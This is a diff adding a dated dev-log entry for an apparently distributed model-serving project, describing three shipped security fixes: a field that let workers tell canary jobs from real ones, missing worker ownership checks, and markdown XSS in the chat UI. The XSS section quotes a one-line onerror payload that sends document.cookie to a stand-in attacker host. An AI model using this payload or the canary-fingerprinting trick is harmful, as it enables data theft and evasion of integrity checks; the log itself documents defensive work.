@@ -5,6 +5,174 @@ entries on top. Skim for context before resuming work.
 
 ---
 
+## 2026-05-13 — Security review: three critical fixes shipped
+
+A focused security pass surfaced three real exploitable issues, two
+of which subverted the same security investments we shipped over
+the previous two days (canaries, browser auth on the chat UI). All
+three landed in one slice.
+
+### 1. Canary detection leak — `submitted_by_member_id` in worker envelope
+
+**The bug.** `/generate` was pushing job envelopes to Redis that
+included `submitted_by_member_id`. Canaries set this to NULL (no
+human submitter); real prompts set it to the calling member's ID.
+A worker reading its own incoming jobs could trivially classify
+each one as "canary" or "real" and pass canaries cleanly while
+cheating on real prompts. Defeated the entire integrity slice.
+
+**The fix.** Dropped the field from the worker-facing envelope.
+The worker never reads it; attribution lives on `jobs.submitted_by_member_id`
+which the coordinator reads directly when crediting earnings +
+`member_usage`. Also discovered the canary injector's envelope was
+*missing* `submitted_at` (a separate fingerprint vector — real
+envelopes had it, canaries didn't), and aligned the shapes.
+
+**Test.** `CanaryEnvelopeLeakTests` includes a key-set comparison
+between a real envelope and a canary envelope; if their JSON keys
+differ at all, a malicious worker can fingerprint them.
+
+### 2. Worker→member binding missing
+
+**The bug.** `/jobs/complete`, `/jobs/claim`, `/jobs/abandon`,
+`/heartbeat`, and `/jobs/next` all accepted any `worker_id` from
+any authenticated member. A member could:
+- Send a `/jobs/complete` with someone else's `worker_id` and an
+  arbitrary response text. The coordinator would write that text
+  to `jobs.result` and Redis, deliver it to the original
+  submitter, AND credit earnings to the spoofed worker.
+- Send a `/jobs/abandon` with someone else's `worker_id` to
+  disrupt their pipeline.
+
+Friend-network today, but a hard "no" once we onboard strangers.
+
+**The fix.** New `workers.owner_member_id` column (additive
+migration). `/register` is the canonical ownership-claim
+endpoint:
+
+- New worker_id → insert with caller as owner.
+- Existing worker_id with same owner → refresh status.
+- Existing worker_id with different owner → 403.
+- Existing worker_id with NULL owner (legacy pre-migration row) →
+  caller adopts ownership.
+
+Atomic via `BEGIN IMMEDIATE` so concurrent registers can't race.
+
+All worker-facing endpoints now call `_require_worker_owner(request,
+worker_id)`. Auth-off mode (no `API_TOKEN`) is permissive (dev
+loops). Admin role bypasses ownership for incident response. The
+in-VPS mock worker uses the admin token, so its existing rows
+adopt admin as owner on next register — no manual migration needed.
+
+**Tests.** 7 new cases covering: stamps owner on first register,
+rejects conflicting owner, accepts re-register by same owner,
+adopts legacy unowned rows, rejects non-owner /jobs/complete,
+admin bypass, happy-path owner /jobs/complete.
+
+### 3. Markdown XSS surface in the chat UI
+
+**The bug.** Assistant responses went through `marked.parse(text)`
+which by default passes raw HTML through. A contributor running a
+tampered model could craft a response containing
+`<img src=x onerror="fetch('https://attacker/?c='+document.cookie)">`
+and (since the session cookie is HttpOnly the cookie itself is
+safe, but) read the user's other DOM state, exfiltrate conversation
+content, etc. Canaries detect tampering behaviorally but not at the
+HTML level — they check required tokens are present, not that HTML
+is absent.
+
+**The fix.** Two pieces:
+
+1. **Self-host JS.** Replaced
+   `<script src="https://cdn.jsdelivr.net/.../marked.min.js">` with
+   `<script src="/static/marked.min.js">` served from
+   `client/static/` (and a mirror at `coordinator/static/` for the
+   ToS page). Eliminates a CDN compromise vector for both pages.
+   Same supply-chain logic as the Ollama-installer mirror.
+   Pinned versions: marked 12.0.0, DOMPurify 3.0.11.
+2. **Sanitize on render.** Chat UI now does
+   `DOMPurify.sanitize(marked.parse(text))` for assistant messages.
+   ToS page does the same for the rendered markdown. If DOMPurify
+   isn't available for any reason, the chat UI falls back to
+   `.textContent` (literal text, no rendering) rather than risk raw
+   HTML execution.
+
+Caddy route added for `/static/*` → client:8080.
+
+**Tests.** New cases in `test_web_ui_smoke.py` verify:
+- Chat UI references `/static/` paths, NOT `cdn.jsdelivr.net`
+- Vendored files are actually served (>1KB each)
+- HTML contains the `DOMPurify.sanitize` call
+
+### Documented but deliberately deferred
+
+The review surfaced three more 🟡 items not fixed tonight:
+
+- **No SRI on the (now-unused) CDN URLs.** Self-hosting moots this
+  for marked/DOMPurify, but worth noting if we ever bring back CDN
+  loads.
+- **No prompt length cap on /generate.** ~15 min to add an env
+  guard; not exploitable enough to warrant blocking the security
+  slice on it. Next.
+- **No rate limit on /login.** 256-bit bearer entropy makes brute
+  force impractical, but the principle is wrong. Enable
+  `RATE_LIMIT_PER_MIN` in prod (already wired into the middleware,
+  just unset env). Next.
+
+Plus the medium items (cookie value IS the bearer, agent state.json
+plaintext, no admin audit log) which are tradeoffs we've consciously
+accepted at this stage. All written up in `project-gaps.md` under
+the new "Open security findings" section.
+
+### Test scoreboard
+
+- 170/170 passing (158 → 170 with this slice, +12 new).
+- Coverage spans worker ownership claims, ownership rejection paths,
+  envelope-shape parity between canary and real jobs, and the
+  vendored-JS routing.
+
+### File layout changes
+
+```
+client/static/{marked.min.js,purify.min.js}      <- vendored (60K total)
+coordinator/static/{marked.min.js,purify.min.js} <- mirror for ToS page
+client/web.py                                    <- mount /static,
+                                                    DOMPurify-wrap assistant md
+coordinator/main.py                              <- mount /static, _require_worker_owner,
+                                                    ownership stamp on /register,
+                                                    drop submitted_by_member_id from
+                                                    worker envelopes
+coordinator/db.py                                <- workers.owner_member_id column,
+                                                    claim_worker_ownership() +
+                                                    worker_owner() helpers
+coordinator/canaries.py                          <- canary envelope adds
+                                                    submitted_at for shape parity
+infra/Caddyfile                                  <- /static/* route
+tests/test_tos_and_canaries.py                   <- +9 tests (canary leak,
+                                                    worker ownership)
+tests/test_web_ui_smoke.py                       <- +3 tests (vendored JS,
+                                                    no-CDN, DOMPurify wrap)
+docs/project-gaps.md                             <- "Open security findings"
+                                                    section recording the
+                                                    high/medium items
+```
+
+### Deploy
+
+```bash
+ssh -i ~/.ssh/id_ed25519_gamerai root@5.161.235.139
+cd /opt/gamerai
+git pull
+sudo /opt/gamerai/infra/deploy.sh
+docker restart gamerai-caddy
+```
+
+The in-VPS mock worker will need to /register once after deploy to
+adopt the admin as its owner. The agent on the founder's Windows
+box will adopt the admin via its next self-update + register cycle.
+
+---
+
 ## 2026-05-12 — ChatGPT-shaped UI: conversations, browser auth, chat rewrite
 
 Three connected slices that turn the single-prompt-and-result form
